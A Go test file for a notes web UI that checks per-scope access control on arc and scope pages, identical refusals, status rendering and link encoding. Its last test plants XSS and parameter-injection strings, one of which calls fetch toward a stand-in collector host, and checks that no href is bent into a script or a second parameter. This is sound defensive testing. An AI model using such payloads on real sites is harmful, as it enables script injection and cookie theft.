package ui

import (
	"encoding/json"
	"html"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"github.com/ZacxDev/cairn/internal/arcs"
	"github.com/ZacxDev/cairn/internal/control"
	"github.com/ZacxDev/cairn/internal/identity"
	"github.com/ZacxDev/cairn/internal/report"
	"github.com/ZacxDev/cairn/internal/store"
)

// 🔴 S4'S GUARDS: THE SCOPE PAGE'S SESSIONS-AND-ARCS SECTION AND THE `/arc` PAGE, DRIVEN THROUGH THE
// REAL DISPATCHER OVER THE REAL `StoreSource`, A STORE ON DISK AND A JOURNAL FILE OUTSIDE IT. Every
// name, session id and date below is SYNTHETIC — this repository is public. Each refusal is paired
// with a principal for whom the SAME request is a real answer, because a handler that refused
// everything would satisfy every absence assertion here.

// The three-principal world: A reads alpha only, B reads beta only, and W ("wide") reads both.
var (
	arcsWide     = control.DerivedID(control.PrefixUser, "arcs-wide-reader")
	arcsSlugSeen = "lantern-arc" // homed in alpha, NO status — the `unknown` case
	// Two arcs homed in BETA. `veiled-arc` declares only beta but its member wrote in alpha
	// (INFERRED on alpha for W); `shrouded-arc` DECLARES alpha. Both must be invisible to A.
	arcsSlugVeiled   = "veiled-arc"
	arcsSlugShrouded = "shrouded-arc"
	// The member sessions. `s-lamp-0001` wrote in alpha and is a member of every arc above.
	arcsSessionAlpha = "s-lamp-0001"
	arcsSessionBeta  = "s-wick-0002"
)

// arcsWorld is `twoScopeWorld` plus a third principal who belongs to both projects.
func arcsWorld(t *testing.T) (readsA, readsB, readsW identity.Identity) {
	t.Helper()
	at := browseClock
	m, err := control.Replay([]control.Event{
		{Kind: control.EventUserCreated, At: at, UserID: browseReader,
			Provider: "fixture-provider", Subject: "00000000-0000-4000-8000-000000000041",
			Email: "reader@notes.example.invalid"},
		{Kind: control.EventUserCreated, At: at, UserID: browseOutsider,
			Provider: "fixture-provider", Subject: "00000000-0000-4000-8000-000000000042",
			Email: "outsider@notes.example.invalid"},
		{Kind: control.EventUserCreated, At: at, UserID: arcsWide,
			Provider: "fixture-provider", Subject: "00000000-0000-4000-8000-000000000043",
			Email: "wide@notes.example.invalid"},
		{Kind: control.EventProjectCreated, At: at, ProjectID: browseProjectA, Name: "alpha", UserID: browseReader},
		{Kind: control.EventMemberSet, At: at, ProjectID: browseProjectA, UserID: browseReader, Role: control.RoleOwner},
		{Kind: control.EventMemberSet, At: at, ProjectID: browseProjectA, UserID: arcsWide, Role: control.RoleMember},
		{Kind: control.EventScopeCreated, At: at, ScopeID: browseScopeA, DisplayName: "alpha-notes", ProjectID: browseProjectA},
		{Kind: control.EventProjectCreated, At: at, ProjectID: browseProjectB, Name: "beta", UserID: browseOutsider},
		{Kind: control.EventMemberSet, At: at, ProjectID: browseProjectB, UserID: browseOutsider, Role: control.RoleOwner},
		{Kind: control.EventMemberSet, At: at, ProjectID: browseProjectB, UserID: arcsWide, Role: control.RoleMember},
		{Kind: control.EventScopeCreated, At: at, ScopeID: browseScopeB, DisplayName: "beta-notes", ProjectID: browseProjectB},
	})
	if err != nil {
		t.Fatalf("building the arcs world: %v", err)
	}
	resolve := func(id control.ID) identity.Identity {
		p, known := m.PrincipalFor(control.KindUser, id)
		if !known {
			t.Fatalf("the world does not hold principal %s", id)
		}
		return identity.Identity{Principal: p, Auth: control.Resolve(m, p)}
	}
	readsA, readsB, readsW = resolve(browseReader), resolve(browseOutsider), resolve(arcsWide)
	// INSTRUMENT CONTROL: the authorities are what this file's assertions assume.
	if !readsA.Auth.Allows(browseScopeA, control.VerbRead) || readsA.Auth.Allows(browseScopeB, control.VerbRead) {
		t.Fatal("principal A does not read exactly alpha")
	}
	if !readsB.Auth.Allows(browseScopeB, control.VerbRead) || readsB.Auth.Allows(browseScopeA, control.VerbRead) {
		t.Fatal("principal B does not read exactly beta")
	}
	if !readsW.Auth.Allows(browseScopeA, control.VerbRead) || !readsW.Auth.Allows(browseScopeB, control.VerbRead) {
		t.Fatal("principal W does not read both scopes, so it cannot be the positive control")
	}
	return readsA, readsB, readsW
}

// arcsStore is two scopes with ATTRIBUTED bullets: alpha carries two trailered bullets (one per
// session) and one untrailered; beta carries one by the beta session.
func arcsStore(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	put := func(scope, service, nuance string) {
		dir := filepath.Join(root, scope)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		body := "---\nservice: " + service + "\nscope: " + scope + "\n---\n\n## What it is\n\nsynthetic.\n\n" +
			store.NuanceHeading + "\n\n" + nuance
		if err := os.WriteFile(filepath.Join(dir, service+".md"), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	put("alpha-notes", "lamphouse",
		"- 2000-01-03: trimmed the wick [cairn: tallow-bot/"+arcsSessionAlpha+"]\n"+
			"- 2000-01-02: an unsigned bullet\n")
	put("beta-notes", "chandlery",
		"- 2000-01-04: poured the wax [cairn: tallow-bot/"+arcsSessionBeta+"]\n")
	return root
}

// arcsJournal writes the registrations as journal lines, OUTSIDE the store root, and returns the
// path. Written as the pod writes them — one JSON object per line — so the UI reads them through
// the real `arcs.Journal.Read`.
func arcsJournal(t *testing.T, regs ...arcs.Registration) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "journal.jsonl")
	var b strings.Builder
	for _, r := range regs {
		line, err := json.Marshal(r)
		if err != nil {
			t.Fatal(err)
		}
		b.Write(line)
		b.WriteByte('\n')
	}
	if err := os.WriteFile(path, []byte(b.String()), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func arcReg(home, slug, status string, declared []string, members ...arcs.Member) arcs.Registration {
	return arcs.Registration{Schema: arcs.Schema, Home: home, Slug: slug, Status: status,
		ClosingKind: arcs.ClosingCheck, DeclaredScopes: declared, WritersMeasured: true,
		CommitsTotal: 5, CommitsUnstamped: 1, ReportedAt: "2000-01-05T00:00:00Z", Members: members,
		RegisteredBy: "fixture-registrar", RegisteredAt: "2000-01-06T07:08:09Z"}
}

// defaultArcs is the world's three registrations.
func defaultArcs() []arcs.Registration {
	return []arcs.Registration{
		arcReg("alpha-notes", arcsSlugSeen, arcs.StatusUnknown, []string{"alpha-notes"},
			arcs.Member{Session: arcsSessionAlpha, Role: "originated", FirstSeen: "2000-01-01T00:00:00Z"}),
		arcReg("beta-notes", arcsSlugVeiled, arcs.StatusOpen, []string{"beta-notes"},
			arcs.Member{Session: arcsSessionAlpha, Role: "wrote"},
			arcs.Member{Session: arcsSessionBeta, Role: "originated"}),
		arcReg("beta-notes", arcsSlugShrouded, arcs.StatusClosed, []string{"alpha-notes", "beta-notes"},
			arcs.Member{Session: arcsSessionBeta, Role: "wrote"}),
	}
}

func arcsServer(t *testing.T, src Source, id identity.Identity) *Server {
	t.Helper()
	cfg := testConfig(t, staticAuth{id})
	cfg.Source = src
	srv, err := New(cfg)
	if err != nil {
		t.Fatalf("the server did not build: %v", err)
	}
	return srv
}

func arcURL(home control.ID, slug string) string {
	return ArcPath + "?" + url.Values{QueryHome: []string{string(home)}, QuerySlug: []string{slug}}.Encode()
}

func scopeURL(id control.ID) string { return ScopePath + "?" + QueryID + "=" + string(id) }

// scopeTabURL is the scope page's URL on one tab — spelled here by hand rather than through
// `scopeTabHref`, so a builder that dropped the tab would be caught rather than mirrored.
func scopeTabURL(id control.ID, tab string) string {
	return ScopePath + "?" + url.Values{QueryID: []string{string(id)}, QueryTab: []string{tab}}.Encode()
}

// inAttr is how a string appears inside a rendered attribute value: gomponents escapes attribute
// values with `html.EscapeString`, so a tooltip check must look for the escaped form.
func inAttr(s string) string { return html.EscapeString(s) }

// visibleText is the page's text content with tags removed and entities resolved enough for a
// substring check — so an absence assertion cannot be satisfied by the string merely being split
// across markup, and a presence assertion is about what a reader sees.
func visibleText(body string) string {
	text := regexp.MustCompile(`<[^>]*>`).ReplaceAllString(body, " ")
	return strings.NewReplacer("&#34;", `"`, "&#39;", "'", "&amp;", "&", "&lt;", "<", "&gt;", ">").Replace(text)
}

// TestAnArcHomedInAnUnreadableScopeRendersExactlyLikeANeverRegisteredOne is the browser equivalent of
// S3's `TestAnArcHomedInAnUnreadableScopeLeaksNothing`, on the arc page.
//
// 🔴 SAME STATUS, SAME BYTES, FOR EVERY WAY TO MISS — and none of them names the home or the slug.
// The positive control is W, for whom the IDENTICAL URL renders the arc.
func TestAnArcHomedInAnUnreadableScopeRendersExactlyLikeANeverRegisteredOne(t *testing.T) {
	readsA, _, readsW := arcsWorld(t)
	src := StoreSource{Root: arcsStore(t), ArcJournal: arcsJournal(t, defaultArcs()...)}
	srvA := arcsServer(t, src, readsA)

	absentHome := control.DerivedID(control.PrefixScope, "no-such-scope-anywhere")
	misses := map[string]string{
		"a REGISTERED arc homed in a scope A cannot read": arcURL(browseScopeB, arcsSlugVeiled),
		"a second registered arc in that scope":           arcURL(browseScopeB, arcsSlugShrouded),
		"a never-registered slug under the same home":     arcURL(browseScopeB, "never-registered-anywhere"),
		"a never-registered slug under A's own home":      arcURL(browseScopeA, "never-registered-anywhere"),
		"a home id that exists nowhere":                   arcURL(absentHome, arcsSlugVeiled),
		// The home spelled as a NAME rather than an id: an id is what the page links, and a name
		// is not one — so it must miss the same way rather than resolve.
		"the hidden home spelled by name": ArcPath + "?" + url.Values{
			QueryHome: []string{"beta-notes"}, QuerySlug: []string{arcsSlugVeiled}}.Encode(),
	}
	var first *httptest.ResponseRecorder
	for name, target := range misses {
		rec := getAs(t, srvA, target)
		if rec.Code != http.StatusNotFound {
			t.Errorf("%s answered %d, want 404: %s", name, rec.Code, rec.Body.String())
			continue
		}
		if body := rec.Body.String(); body != report.ArcUnregisteredBody {
			t.Errorf("%s answered body %q, want the pod's own arc-unregistered sentence %q", name, body,
				report.ArcUnregisteredBody)
		}
		for _, leak := range []string{arcsSlugVeiled, arcsSlugShrouded, "beta-notes", arcsSessionBeta} {
			if strings.Contains(rec.Body.String(), leak) {
				t.Errorf("THE REFUSAL FOR %s NAMES %q — an arc homed in a scope this caller cannot read must "+
					"leak neither its home nor its slug", name, leak)
			}
		}
		if first == nil {
			first = rec
		} else if rec.Code != first.Code || rec.Body.String() != first.Body.String() {
			t.Errorf("the misses DIFFER (%s answered %d %q vs %d %q): any difference is an oracle over the "+
				"registry", name, rec.Code, rec.Body.String(), first.Code, first.Body.String())
		}
	}

	// POSITIVE CONTROL 1: the same URL is a real answer for a caller who reads the home.
	wide := getAs(t, arcsServer(t, src, readsW), arcURL(browseScopeB, arcsSlugVeiled))
	if wide.Code != http.StatusOK {
		t.Fatalf("POSITIVE CONTROL FAILED: W, who reads beta, got %d for the veiled arc: %s. Every refusal "+
			"above is then satisfied by a page that refuses everything.", wide.Code, wide.Body.String())
	}
	// The member is a link to its session page now (short id visible, full id in the href).
	if text := visibleText(wide.Body.String()); !strings.Contains(text, arcsSlugVeiled) ||
		!strings.Contains(wide.Body.String(), `href="`+inAttr(sessionHref(arcsSessionBeta))+`"`) {
		t.Errorf("W's arc page does not name the arc and link its member, so its 200 may not be the arc page:\n%s", text)
	}
	// POSITIVE CONTROL 2: A's OWN arc renders for A.
	own := getAs(t, srvA, arcURL(browseScopeA, arcsSlugSeen))
	if own.Code != http.StatusOK || !strings.Contains(visibleText(own.Body.String()), arcsSlugSeen) {
		t.Fatalf("POSITIVE CONTROL FAILED: A's own arc answered %d: %s", own.Code, own.Body.String())
	}
}

// TestTheScopePageListsOnlyArcsWhoseHomeIsReadable is the same rule on the LIST — a leak needs no
// reachable URL, which is the README's "a guard on a REFUSAL is not a guard on a LEAK".
func TestTheScopePageListsOnlyArcsWhoseHomeIsReadable(t *testing.T) {
	readsA, _, readsW := arcsWorld(t)
	src := StoreSource{Root: arcsStore(t), ArcJournal: arcsJournal(t, defaultArcs()...)}

	pageA := getAs(t, arcsServer(t, src, readsA), scopeTabURL(browseScopeA, TabArcs))
	if pageA.Code != http.StatusOK {
		t.Fatalf("A's own scope page answered %d: %s", pageA.Code, pageA.Body.String())
	}
	textA := visibleText(pageA.Body.String())
	if !strings.Contains(textA, "alpha-notes/"+arcsSlugSeen) {
		t.Errorf("A's alpha page does not list A's own arc %q, so the absences below may be an empty section", arcsSlugSeen)
	}
	// 🔴 EVERY TAB, NOT ONLY THE ARCS ONE: the tab labels carry counts computed from the same reports,
	// and the sessions tab carries arc chips — three renderings, so three places a hidden arc could
	// surface.
	for _, tab := range []string{"", TabSessions, TabArcs} {
		body := getAs(t, arcsServer(t, src, readsA), scopeTabURL(browseScopeA, tab)).Body.String()
		for _, leak := range []string{arcsSlugVeiled, arcsSlugShrouded, "beta-notes"} {
			if strings.Contains(body, leak) {
				t.Errorf("A's alpha page (tab %q) CONTAINS %q — an arc homed in beta, which A cannot read, leaked onto "+
					"a page about a scope A can (Q1: listed only when its HOME is readable)", tab, leak)
			}
		}
	}
	if !strings.Contains(textA, "1 of 1 sessions in an arc") {
		t.Errorf("A's arcs tab does not carry the counted sessions stat for its own view:\n%s", textA)
	}

	// POSITIVE CONTROL: W reads beta, so the same alpha page lists BOTH beta-homed arcs, each with
	// its provenance (the word visible, the report's full provenance in the badge's tooltip).
	pageW := getAs(t, arcsServer(t, src, readsW), scopeTabURL(browseScopeA, TabArcs))
	textW := visibleText(pageW.Body.String()) + pageW.Body.String()
	for _, want := range []string{
		"beta-notes/" + arcsSlugVeiled, `title="` + inAttr("inferred ("+arcsSessionAlpha+" wrote here)") + `"`,
		"beta-notes/" + arcsSlugShrouded, "declared",
	} {
		if !strings.Contains(textW, want) {
			t.Errorf("POSITIVE CONTROL: W's alpha page does not carry %q, so A's absence above is not a "+
				"measurement of the home rule", want)
		}
	}
	// 🔴 AND THE HREF IS THE ARC PAGE'S, BUILT FROM THE HOME'S ID — the link W can follow.
	if !strings.Contains(pageW.Body.String(), `href="`+strings.ReplaceAll(arcURL(browseScopeB, arcsSlugVeiled), "&", "&amp;")+`"`) {
		t.Errorf("W's alpha page does not link the veiled arc's page at %s", arcURL(browseScopeB, arcsSlugVeiled))
	}
}

// TestTheSectionIsTheSameAnswerTheReportsGiveForTheSameVisibleSet pins the RELATIONSHIP the design
// rests on: the page renders `report.Sessions`/`report.Arcs` over `Authorization.VisibleScopes(
// VerbRead)` — the pod's own spelling of the narrowing — and nothing else. Computed here
// independently from the authority and compared line by line, so a section that narrowed through a
// different set (wider, or a different verb) shows a different list.
func TestTheSectionIsTheSameAnswerTheReportsGiveForTheSameVisibleSet(t *testing.T) {
	readsA, _, readsW := arcsWorld(t)
	root := arcsStore(t)
	journal := arcsJournal(t, defaultArcs()...)
	src := StoreSource{Root: root, ArcJournal: journal}
	snap, err := arcs.Journal{Path: journal}.Read()
	if err != nil {
		t.Fatal(err)
	}
	for name, who := range map[string]identity.Identity{"A": readsA, "W": readsW} {
		visible := who.Auth.VisibleScopes(control.VerbRead) // the pod's `rq.visible`, spelled the pod's way
		sessions, err := report.Sessions(root, "alpha-notes", visible)
		if err != nil {
			t.Fatal(err)
		}
		arcsRep, err := report.Arcs(root, "alpha-notes", visible, &snap)
		if err != nil {
			t.Fatal(err)
		}
		if len(sessions.Sessions) == 0 || len(arcsRep.Arcs) == 0 {
			t.Fatalf("INSTRUMENT: the reports list nothing for %s (%d sessions, %d arcs), so the comparison is vacuous",
				name, len(sessions.Sessions), len(arcsRep.Arcs))
		}
		// The two tabs, raw: the NUMBERS are visible text and the report's own sentences are tooltips,
		// so both are read from the bytes (a tooltip is an attribute, which `visibleText` strips).
		sessionsTab := getAs(t, arcsServer(t, src, who), scopeTabURL(browseScopeA, TabSessions)).Body.String()
		arcsTab := getAs(t, arcsServer(t, src, who), scopeTabURL(browseScopeA, TabArcs)).Body.String()
		page := sessionsTab + arcsTab
		c := sessions.Coverage
		want := []string{
			strconv.Itoa(c.Attributed) + " of " + strconv.Itoa(c.Bullets) + " bullets attributed",
			strconv.Itoa(arcsRep.InArcs) + " of " + strconv.Itoa(arcsRep.Sessions) + " sessions in an arc",
			inAttr(sessions.AttributedLine()), inAttr(arcsRep.SessionsLine()), inAttr(arcsRep.StatusesLine()),
		}
		for _, s := range sessions.Sessions {
			want = append(want, `href="`+inAttr(sessionHref(s.ID))+`"`, strings.Join(s.Actors, ", "))
		}
		for _, a := range arcsRep.Arcs {
			want = append(want, a.Home+"/"+a.Slug, inAttr(a.Provenance()))
		}
		for _, line := range want {
			if !strings.Contains(page, line) {
				t.Errorf("%s's alpha page is missing %q, which the reports give for %s's visible set", name, line, name)
			}
		}
		// And nothing listed that the reports do not list: every arc label on the page is one of theirs.
		listed := map[string]bool{}
		for _, a := range arcsRep.Arcs {
			listed[a.Home+"/"+a.Slug] = true
		}
		for _, r := range defaultArcs() {
			label := r.Home + "/" + r.Slug
			if strings.Contains(page, label) && !listed[label] {
				t.Errorf("%s's alpha page lists %q, which report.Arcs does not list for %s's visible set", name, label, name)
			}
		}
	}
}

// TestAScopeTheCallerCannotReadGetsTheExistingRefusalAndNoSection: the section adds no way in. B
// cannot read alpha, so B's request for it is the browse refusal, byte for byte the absent one, and
// the section's source method is never even asked.
func TestAScopeTheCallerCannotReadGetsTheExistingRefusalAndNoSection(t *testing.T) {
	readsA, readsB, _ := arcsWorld(t)
	src := &touchCounting{inner: StoreSource{Root: arcsStore(t), ArcJournal: arcsJournal(t, defaultArcs()...)}}
	srvB := arcsServer(t, src, readsB)

	refused := getAs(t, srvB, scopeURL(browseScopeA))
	absent := getAs(t, srvB, scopeURL(control.DerivedID(control.PrefixScope, "no-such-scope-anywhere")))
	if refused.Code != http.StatusNotFound || refused.Body.String() != browseRefusal {
		t.Errorf("B's request for alpha answered %d %q, want the browse refusal", refused.Code, refused.Body.String())
	}
	if refused.Code != absent.Code || refused.Body.String() != absent.Body.String() {
		t.Errorf("not-yours (%d %q) and absent (%d %q) differ", refused.Code, refused.Body.String(),
			absent.Code, absent.Body.String())
	}
	if strings.Contains(refused.Body.String(), arcsSessionAlpha) || strings.Contains(refused.Body.String(), arcsSlugSeen) {
		t.Error("the refusal carries alpha's session or arc")
	}
	if src.touched != 0 {
		t.Errorf("the section's source was asked %d time(s) for a scope the caller cannot read; the refusal must "+
			"come first", src.touched)
	}
	// POSITIVE CONTROL: A's request for the same id renders the section with A's session, and DID ask.
	own := getAs(t, arcsServer(t, src, readsA), scopeTabURL(browseScopeA, TabSessions))
	if own.Code != http.StatusOK || !strings.Contains(own.Body.String(), `title="`+arcsSessionAlpha+`"`) {
		t.Fatalf("POSITIVE CONTROL FAILED: A's own alpha page answered %d without its session: %s", own.Code, own.Body.String())
	}
	if src.touched != 1 {
		t.Errorf("POSITIVE CONTROL: A's page asked the section's source %d time(s), want 1", src.touched)
	}
}

// touchCounting wraps a real source and counts `Touched`.
type touchCounting struct {
	inner   StoreSource
	touched int
}

func (c *touchCounting) Visible(a control.Authorization) ([]Scope, error) { return c.inner.Visible(a) }
func (c *touchCounting) Search(a control.Authorization, q, tag string) (SearchResults, error) {
	return c.inner.Search(a, q, tag)
}
func (c *touchCounting) Touched(a control.Authorization, scope string) (Touched, error) {
	c.touched++
	return c.inner.Touched(a, scope)
}
func (c *touchCounting) Arc(a control.Authorization, home, slug string) (report.ArcReport, error) {
	return c.inner.Arc(a, home, slug)
}
func (c *touchCounting) Session(a control.Authorization, session string) (SessionAnswer, error) {
	return c.inner.Session(a, session)
}

// TestAnUnknownStatusIsRenderedAsUnknownAndNeverAsOpen — Q4 on both surfaces: the `lantern-arc`
// registration carries no verdict, and its row and its page say `unknown`, never `open`.
func TestAnUnknownStatusIsRenderedAsUnknownAndNeverAsOpen(t *testing.T) {
	readsA, _, _ := arcsWorld(t)
	src := StoreSource{Root: arcsStore(t), ArcJournal: arcsJournal(t, defaultArcs()...)}
	srv := arcsServer(t, src, readsA)

	page := getAs(t, srv, scopeTabURL(browseScopeA, TabArcs)).Body.String()
	// The row is the `<li>` around the arc's link: from the last `<li` before it to the first
	// `</li>` after it.
	i := strings.Index(page, "alpha-notes/"+arcsSlugSeen+"</a>")
	if i < 0 {
		t.Fatalf("A's alpha page has no linked row for %s:\n%s", arcsSlugSeen, page)
	}
	start := strings.LastIndex(page[:i], "<li")
	end := strings.Index(page[i:], "</li>")
	row := page[start : i+end]
	rowText := visibleText(row)
	if !strings.Contains(row, `<span class="badge" title="status">unknown</span>`) {
		t.Errorf("the unknown-status arc's row has no `unknown` status badge: %q", row)
	}
	if strings.Contains(strings.ToLower(rowText), "open") {
		t.Errorf("THE UNKNOWN-STATUS ARC'S ROW SAYS `open`: %q — an unknown is never rendered as open (Q4)", rowText)
	}
	if !strings.Contains(page, inAttr("statuses: open 0 · closed 0 · unknown 1")) {
		t.Errorf("the statuses tooltip does not count the arc as unknown:\n%s", page)
	}

	arc := getAs(t, srv, arcURL(browseScopeA, arcsSlugSeen))
	// The gloss rides on the badge as its tooltip — the badge and its caveat are one element.
	if want := `<span class="badge" title="` + inAttr(report.UnknownStatusGloss) + `">unknown</span>`; arc.Code != http.StatusOK ||
		!strings.Contains(arc.Body.String(), want) {
		t.Errorf("the arc page (%d) does not carry an `unknown` badge with the unknown gloss:\n%s", arc.Code, arc.Body.String())
	}

	// POSITIVE CONTROL: the detector CAN see `open` — W's row for the OPEN veiled arc carries it.
	_, _, readsW := arcsWorld(t)
	wide := getAs(t, arcsServer(t, src, readsW), scopeTabURL(browseScopeA, TabArcs)).Body.String()
	if !strings.Contains(wide, `<span class="badge" title="status">open</span>`) {
		t.Errorf("POSITIVE CONTROL FAILED: W's page renders no `status open` for the open arc, so the absence " +
			"above may be a renderer that prints no status at all")
	}
}

// TestAnUnconfiguredJournalSaysSoRatherThanFailing — the designed OFF state (Q2): no `-arc-journal`,
// so the scope page renders, with the pod's own unconfigured sentence in the arcs card, and the arc
// page is a 200 saying the same thing — to every caller, about every arc.
func TestAnUnconfiguredJournalSaysSoRatherThanFailing(t *testing.T) {
	readsA, _, _ := arcsWorld(t)
	off := StoreSource{Root: arcsStore(t)}
	srv := arcsServer(t, off, readsA)

	page := getAs(t, srv, scopeTabURL(browseScopeA, TabArcs))
	if page.Code != http.StatusOK {
		t.Fatalf("the scope page with no journal answered %d: %s", page.Code, page.Body.String())
	}
	text := visibleText(page.Body.String())
	// The short line is visible; the pod's own sentence is its tooltip, whole.
	if !strings.Contains(text, arcsOff) || !strings.Contains(page.Body.String(),
		`title="`+inAttr(report.RegistrationsUnconfiguredBody)+`"`) {
		t.Errorf("the unconfigured arcs tab does not say so (short line + the pod's sentence as tooltip):\n%s", page.Body.String())
	}
	// And the tab label carries NO count: "Arcs 0" would be a measurement nobody made.
	if !strings.Contains(page.Body.String(), `data-tab="arcs">Arcs</span>`) {
		t.Errorf("the unconfigured arcs tab label is not a bare `Arcs`:\n%s", page.Body.String())
	}
	if strings.Contains(text, arcJournalUnreadable) {
		t.Error("the unconfigured page says the journal could not be READ — off and broken are different states")
	}
	// The sessions half does not depend on the journal at all.
	if !strings.Contains(getAs(t, srv, scopeTabURL(browseScopeA, TabSessions)).Body.String(), `title="`+arcsSessionAlpha+`"`) {
		t.Error("the sessions tab lost its list with the journal off; it reads the store, not the journal")
	}

	var first string
	for _, target := range []string{arcURL(browseScopeA, arcsSlugSeen), arcURL(browseScopeB, arcsSlugVeiled)} {
		rec := getAs(t, srv, target)
		if rec.Code != http.StatusOK || !strings.Contains(visibleText(rec.Body.String()), report.RegistrationsUnconfiguredBody) {
			t.Errorf("%s with no journal answered %d without the unconfigured sentence: %s", target, rec.Code, rec.Body.String())
		}
		if first == "" {
			first = rec.Body.String()
		} else if rec.Body.String() != first {
			t.Errorf("the unconfigured arc page differs between a readable and an unreadable home — the off " +
				"state must say the same thing about every arc")
		}
	}

	// POSITIVE CONTROL: with a journal, neither page carries the unconfigured sentence.
	on := StoreSource{Root: off.Root, ArcJournal: arcsJournal(t, defaultArcs()...)}
	if strings.Contains(getAs(t, arcsServer(t, on, readsA), scopeTabURL(browseScopeA, TabArcs)).Body.String(), arcsOff) {
		t.Error("POSITIVE CONTROL FAILED: a configured journal still renders the unconfigured sentence")
	}

	// AND A CONFIGURED JOURNAL THAT CANNOT BE READ is a third state: the section says so, the page
	// does not fail, and the arc page is a 503 — "could not look", never "no such arc".
	broken := StoreSource{Root: off.Root, ArcJournal: t.TempDir()} // a directory: ReadFile fails
	brokenPage := getAs(t, arcsServer(t, broken, readsA), scopeTabURL(browseScopeA, TabArcs))
	if brokenPage.Code != http.StatusOK || !strings.Contains(visibleText(brokenPage.Body.String()), arcJournalUnreadable) {
		t.Errorf("an unreadable journal: scope page %d without the could-not-read sentence", brokenPage.Code)
	}
	brokenArc := getAs(t, arcsServer(t, broken, readsA), arcURL(browseScopeA, arcsSlugSeen))
	if brokenArc.Code != http.StatusServiceUnavailable {
		t.Errorf("an unreadable journal: the arc page answered %d, want 503", brokenArc.Code)
	}
}

// TestEveryArcHrefIsASameOriginPathWithEncodedOperands is the URL-scheme guard for this surface's
// new sink. The arc data carries NO URL: every href is built by `arcHref`/`scopeHref` from a ledger
// path plus `url.Values.Encode`. So the property is "every href on these cards is a same-origin path
// to a declared row, and each operand round-trips EXACTLY" — which a hostile slug or home can
// neither bend into a scheme nor split into a second parameter.
//
// ⚠ THE HOSTILE VALUES ARE PLANTED IN THE REPORT VALUE, NOT THE JOURNAL, because the journal's own
// validator refuses them (`validRecord` requires a NORMALIZED slug). That is `hostileWorld`'s ruling
// for tags: a page whose safety depended on a loader invariant would be one new writer away from
// broken.
func TestEveryArcHrefIsASameOriginPathWithEncodedOperands(t *testing.T) {
	hostileSlug := "javascript:alert(document.cookie)&home=evil#x"
	hostileHome := `javascript:fetch('//collector.invalid/c')"><script>x</script>`
	homeID := control.ID("scp_fixture&slug=planted")
	// ⚠ THE COMPACT ROW ALSO LINKS ITS DECLARED SCOPES AND ITS MEMBER SESSIONS, so a hostile member id
	// is planted too — every href on the panel, whichever of the three paths it names, must parse and
	// round-trip its operand exactly.
	hostileMember := `s-1"><script>y</script>&session=planted#z`
	touched := Touched{
		Sessions: report.SessionsReport{Status: report.StatusScopeEmpty, Scope: hostileHome},
		Arcs: report.ArcsReport{Status: report.StatusArcsListed, Scope: hostileHome, Arcs: []report.ArcLine{
			{Home: hostileHome, Slug: hostileSlug, Status: arcs.StatusOpen, ClosingKind: "check", Members: 1, Declared: true,
				DeclaredVisible: []string{hostileHome}, MemberSessions: []string{hostileMember}},
		}},
	}
	var b strings.Builder
	if err := arcsPanel(touched, []Scope{{ID: homeID, Name: hostileHome}}, browseClock).Render(&b); err != nil {
		t.Fatal(err)
	}
	page := b.String()

	hrefs := regexp.MustCompile(`href="([^"]*)"`).FindAllStringSubmatch(page, -1)
	seen := map[string]int{}
	for _, m := range hrefs {
		raw := strings.ReplaceAll(m[1], "&amp;", "&")
		u, err := url.Parse(raw)
		if err != nil || u.Scheme != "" || u.Host != "" {
			t.Errorf("href %q is not a same-origin path", raw)
			continue
		}
		q := u.Query()
		seen[u.Path]++
		var want map[string]string
		switch u.Path {
		case ArcPath:
			want = map[string]string{QueryHome: string(homeID), QuerySlug: hostileSlug}
		case ScopePath:
			want = map[string]string{QueryID: string(homeID)}
		case SessionPath:
			want = map[string]string{QuerySession: hostileMember}
		default:
			t.Errorf("href %q names a path this panel never links", raw)
			continue
		}
		ok := len(q) == len(want)
		for k, v := range want {
			ok = ok && len(q[k]) == 1 && q.Get(k) == v
		}
		if !ok {
			t.Errorf("href %q does not round-trip to exactly %v (got %v): an operand split into a second parameter "+
				"or was altered", raw, want, q)
		}
	}
	// INSTRUMENT: each of the three link kinds was actually rendered, so no branch above is vacuous.
	for _, path := range []string{ArcPath, ScopePath, SessionPath} {
		if seen[path] == 0 {
			t.Errorf("INSTRUMENT: the rendered panel carries no %s href, so its round-trip check measured nothing", path)
		}
	}
	for _, bad := range []string{`href="javascript:`, `href="data:`, "<script"} {
		if strings.Contains(page, bad) {
			t.Errorf("the rendered panel contains %q", bad)
		}
	}
	// POSITIVE CONTROL for the token scan: the raw inputs DO carry what it looks for.
	if !strings.Contains(hostileHome, "<script") || !strings.HasPrefix(hostileSlug, "javascript:") ||
		!strings.Contains(hostileMember, "<script") {
		t.Fatal("INSTRUMENT: the hostile fixtures no longer carry the tokens the scan looks for")
	}
}
